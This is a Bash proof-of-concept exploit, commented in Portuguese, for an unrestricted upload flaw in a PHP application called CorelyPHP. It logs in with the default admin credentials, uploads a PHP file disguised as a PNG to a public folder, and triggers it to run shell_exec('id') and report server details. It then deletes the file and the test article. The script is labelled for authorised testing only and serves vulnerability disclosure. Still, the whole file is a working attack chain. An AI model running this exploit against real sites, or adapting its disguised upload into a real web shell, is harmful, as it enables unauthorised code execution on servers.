#!/usr/bin/env bash
# =============================================================================
# PoC - CorelyPHP: Upload irrestrito -> Execução remota de código (RCE)
#
# Vulnerabilidade : admin/algo/new.alg.php (linhas 92-114) mantém a extensão
#                   original do arquivo enviado em "photoUpload" e o salva em
#                   /articles_photos/, pasta pública onde o Apache executa PHP.
# Pré-requisito   : credencial de admin (padrão do projeto: admin / pass)
# Uso             : ./poc_upload_rce.sh [URL_BASE]
#                   ADMIN_USER=admin ADMIN_PASS=pass ./poc_upload_rce.sh http://localhost:8080
#
# USE APENAS EM AMBIENTE PRÓPRIO / AUTORIZADO.
# A carga é inofensiva: executa só o comando fixo `id`, imprime dados do
# servidor e apaga a si mesma no final. Não aceita comandos externos.
# =============================================================================
set -euo pipefail

BASE="${1:-http://localhost:8080}"
BASE="${BASE%/}"
ADMIN_USER="${ADMIN_USER:-admin}"
ADMIN_PASS="${ADMIN_PASS:-pass}"
TS="$(date +%Y%m%d%H%M%S)"
NAME="corely_poc_${TS}"
TITLE="PoC RCE ${TS}"
WORK="$(mktemp -d)"
JAR="${WORK}/cookies.txt"
EVID="poc_evidencia_${TS}.txt"
trap 'rm -rf "$WORK"' EXIT

log() { printf '%s\n' "$*" | tee -a "$EVID"; }

log "=== CorelyPHP - PoC Upload -> RCE ==="
log "Alvo      : ${BASE}"
log "Data/hora : $(date '+%Y-%m-%d %H:%M:%S %z')"
log ""

# --- 1. Login -------------------------------------------------------------
log "[1] Login como '${ADMIN_USER}'..."
curl -s -c "$JAR" -b "$JAR" -o /dev/null \
     --data-urlencode "login=${ADMIN_USER}" \
     --data-urlencode "password=${ADMIN_PASS}" \
     "${BASE}/admin/panel.login.alg.php"

if ! curl -s -b "$JAR" "${BASE}/admin/panel.php" | grep -q "Admin Panel"; then
  log "    FALHA: login recusado. Verifique ADMIN_USER / ADMIN_PASS."
  exit 1
fi
log "    OK: sessão de admin obtida."

# --- 2. Monta os arquivos ---------------------------------------------------
cat > "${WORK}/${NAME}.php" <<'PHP'
<?php
// Carga de PoC inofensiva - CorelyPHP upload RCE
if (isset($_GET['cleanup'])) { @unlink(__FILE__); echo "POC-REMOVIDO"; exit; }
header('Content-Type: text/plain');
echo "CORELY-RCE-POC\n";
echo "calculo 6*7     : ", 6 * 7, "\n";
echo "comando `id`    : ", trim((string) @shell_exec('id')), "\n";
echo "hostname        : ", gethostname(), "\n";
echo "sistema         : ", php_uname(), "\n";
echo "versao PHP      : ", PHP_VERSION, "\n";
echo "arquivo         : ", __FILE__, "\n";
PHP
echo "Texto de teste da análise de segurança (${TS})." > "${WORK}/poc.txt"

# --- 3. Upload ------------------------------------------------------------
log ""
log "[2] Enviando '${NAME}.php' no campo de FOTO (Content-Type forjado image/png)..."
curl -s -b "$JAR" -o /dev/null \
     -F "title=${TITLE}" \
     -F "textUpload=@${WORK}/poc.txt;type=text/plain" \
     -F "photoUpload=@${WORK}/${NAME}.php;type=image/png;filename=${NAME}.php" \
     -F "visibility=on" \
     "${BASE}/admin/algo/new.alg.php"
log "    Upload enviado."

# --- 4. Execução ------------------------------------------------------------
URL="${BASE}/articles_photos/${NAME}.php"
log ""
log "[3] Requisitando ${URL}"
CODE="$(curl -s -o "${WORK}/resp.txt" -w '%{http_code}' "$URL")"
log "    HTTP ${CODE}"
log "    ---------- resposta do servidor ----------"
sed 's/^/    /' "${WORK}/resp.txt" | tee -a "$EVID"
log "    ------------------------------------------"

log ""
if [[ "$CODE" == "200" ]] && grep -q "^calculo 6\*7     : 42$" "${WORK}/resp.txt"; then
  log "RESULTADO: VULNERÁVEL - o servidor executou o PHP enviado como imagem."
  VULN=1
elif grep -q "CORELY-RCE-POC" "${WORK}/resp.txt"; then
  log "RESULTADO: PARCIAL - arquivo servido, mas o código-fonte veio sem ser executado."
  VULN=0
else
  log "RESULTADO: NÃO VULNERÁVEL - arquivo bloqueado ou não executado (HTTP ${CODE})."
  VULN=0
fi

# --- 5. Limpeza ---------------------------------------------------------------
log ""
log "[4] Limpeza..."
if [[ "${VULN}" == "1" ]]; then
  curl -s "${URL}?cleanup=1" | grep -q "POC-REMOVIDO" \
    && log "    Arquivo PoC removido do servidor." \
    || log "    ATENÇÃO: remova manualmente articles_photos/${NAME}.php"
else
  log "    Se o arquivo existir, remova manualmente: articles_photos/${NAME}.php"
fi

ID="$(curl -s -b "$JAR" "${BASE}/admin/panel.php?window=all-articles" \
      | grep -o "<td>[0-9]*</td><td>${TITLE}</td>" | head -1 \
      | sed -E 's#<td>([0-9]+)</td>.*#\1#' || true)"
if [[ -n "${ID}" ]]; then
  curl -s -b "$JAR" -o /dev/null -d "id=${ID}" "${BASE}/admin/algo/delate.alg.php"
  log "    Artigo de teste #${ID} apagado."
else
  log "    Artigo de teste não encontrado (apague '${TITLE}' pelo painel, se existir)."
fi

curl -s -b "$JAR" -o /dev/null "${BASE}/admin/panel.logout.alg.php"
log "    Logout feito."
log ""
log "Evidência salva em: ${EVID}"
